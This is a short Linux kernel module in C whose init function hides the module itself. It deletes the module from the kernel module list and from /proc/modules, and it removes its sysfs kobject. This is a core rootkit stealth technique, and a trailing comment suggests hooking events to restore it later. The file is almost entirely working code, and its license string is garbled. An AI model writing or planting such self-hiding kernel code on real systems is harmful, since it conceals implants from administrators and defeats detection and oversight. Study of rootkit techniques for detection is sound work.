#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>

MODULE_LICENSE("Gcat /PL");
MODULE_AUTHOR("Maha");
MODULE_DESCRIPTION("BLAH BLAH");

static int __init hide_module_init(void)
{
printk("hiding module %s\n:-)",THIS_MODULE->name);
list_del(&THIS_MODULE->list); //this removes from /proc/modules and internal list

kobject_del(&THIS_MODULE->mkobj.kobj);

return 0;
}

static void __exit hide_module_exit(void)
{
printk(KERN_INFO "Module unloaded");
}

module_init(hide_module_init);
module_exit(hide_module_exit);
//to relaod is back, we need to save its reference, and on exiting manually need to add it back, or add it back in case of some event by hooking onto something.
